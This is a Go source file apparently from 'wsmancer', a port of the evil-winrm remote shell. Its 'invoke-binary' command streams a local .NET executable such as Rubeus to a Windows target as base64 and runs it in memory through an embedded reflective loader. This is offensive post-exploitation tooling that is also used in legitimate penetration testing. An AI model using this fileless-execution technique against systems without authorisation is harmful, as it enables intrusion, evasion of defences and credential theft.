package shell

import (
	"context"
	_ "embed"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"github.com/sresarehumantoo/wsmancer/internal/complete"
)

// invokeBinaryFunc is the PowerShell wrapper that defines Invoke-Binary in the
// runspace. It reflection-loads an embedded C# injector (Cabesha.Injector) which
// base64-decodes a .NET assembly, redirects the process stdout/stderr, and calls
// its entry point, returning the captured output. Ported verbatim from Ruby
// evil-winrm's CyberVaca payload so the proven in-memory loader is unchanged.
//
//go:embed assets/invoke-binary.ps1
var invokeBinaryFunc string

// invokeBinVar is the global that holds the base64 assembly while it is streamed
// to the target in envelope-sized chunks, mirroring the -s script loader.
const invokeBinVar = "__ewbin"

const cleanupInvokeBinVar = `Remove-Variable ` + invokeBinVar + ` -Scope Global -ErrorAction SilentlyContinue`

// invokeBinary implements `invoke-binary <local .NET exe> [arg,arg,...]`: read a
// local assembly, stream it to the target as base64, and run it in memory via
// the Invoke-Binary wrapper. The exe is a *local* file, a bare name resolves
// against the -e/--executables directory when one is set.
//
// Arguments to the assembly are comma-separated on the wire, which is what the
// Cabesha parser expects. Because that parser splits on space *and* comma, an
// argument cannot itself contain a space, an evil-winrm limitation this port
// keeps rather than papering over.
func (sh *Shell) invokeBinary(ctx context.Context, sigs <-chan os.Signal, line string) error {
	args := splitArgs(line)[1:]
	if len(args) == 0 {
		return errors.New(`usage: invoke-binary <local .NET exe> [arg1,arg2,...]   (arguments are comma-separated)`)
	}

	exe, err := sh.resolveExecutable(args[0])
	if err != nil {
		return err
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return err
	}
	if len(data) == 0 {
		return fmt.Errorf("%s is empty", exe)
	}

	if err := sh.ensureInvokeBinary(ctx); err != nil {
		return err
	}

	b64 := base64.StdEncoding.EncodeToString(data)
	if err := sh.sendB64Var(ctx, sigs, invokeBinVar, b64); err != nil {
		_, _ = sh.s.RunRaw(ctx, cleanupInvokeBinVar)
		return fmt.Errorf("sending %s: %w", filepath.Base(exe), err)
	}
	defer func() { _, _ = sh.s.RunRaw(ctx, cleanupInvokeBinVar) }()

	sh.log.Event("[invoke-binary] %s (%d bytes)", exe, len(data))
	return sh.executeAs(ctx, sigs, invokeCommand(args[1:]), "invoke-binary "+filepath.Base(exe))
}

// invokeCommand builds the PowerShell call for the Invoke-Binary wrapper given
// the assembly's arguments. The Cabesha parser reads "<b64> ,a,b,c": everything
// before " ," is the assembly, the comma list after it is the program's argv.
// With no arguments the bare variable is passed straight through; otherwise the
// arguments are joined onto it, single-quoted with any embedded quote doubled so
// an argument can't break out of the literal.
func invokeCommand(binArgs []string) string {
	argline := strings.Join(binArgs, ",")
	if argline == "" {
		return "Invoke-Binary $global:" + invokeBinVar
	}
	safe := strings.ReplaceAll(argline, "'", "''")
	return fmt.Sprintf("Invoke-Binary ($global:%s + ' ,%s')", invokeBinVar, safe)
}

// ensureInvokeBinary defines the Invoke-Binary function in the runspace on first
// use. The single runspace persists, so it is loaded at most once per session.
func (sh *Shell) ensureInvokeBinary(ctx context.Context) error {
	if sh.invokeBinaryLoaded {
		return nil
	}
	if err := sh.defineRemoteFunc(ctx, "Invoke-Binary", invokeBinaryFunc); err != nil {
		return err
	}
	sh.invokeBinaryLoaded = true
	return nil
}

// resolveExecutable maps the exe argument to a local file. A bare name (no path
// separator) resolves against -e/--executables when set, so `invoke-binary
// Rubeus.exe` works without typing the full path; anything path-shaped, or a
// name not found in that directory, is used as given.
func (sh *Shell) resolveExecutable(name string) (string, error) {
	if name == "" {
		return "", errors.New("no executable given")
	}
	if sh.o.Executables != "" && !strings.ContainsAny(name, `/\`) {
		p := filepath.Join(sh.o.Executables, name)
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p, nil
		}
	}
	return name, nil
}

// completeExecutable completes the exe argument of invoke-binary. A bare name is
// offered from the -e/--executables directory (its .exe files); a path-shaped
// word, or the absence of -e, falls back to the local filesystem so any assembly
// can still be pointed at.
func (sh *Shell) completeExecutable(word string) []string {
	if sh.o.Executables == "" || strings.ContainsAny(word, `/\`) {
		return complete.LocalPaths(word)
	}
	ents, err := os.ReadDir(sh.o.Executables)
	if err != nil {
		return nil
	}
	lw := strings.ToLower(word)
	var out []string
	for _, e := range ents {
		if e.IsDir() || !strings.EqualFold(filepath.Ext(e.Name()), ".exe") {
			continue
		}
		if strings.HasPrefix(strings.ToLower(e.Name()), lw) {
			out = append(out, e.Name())
		}
	}
	sort.Strings(out)
	return out
}
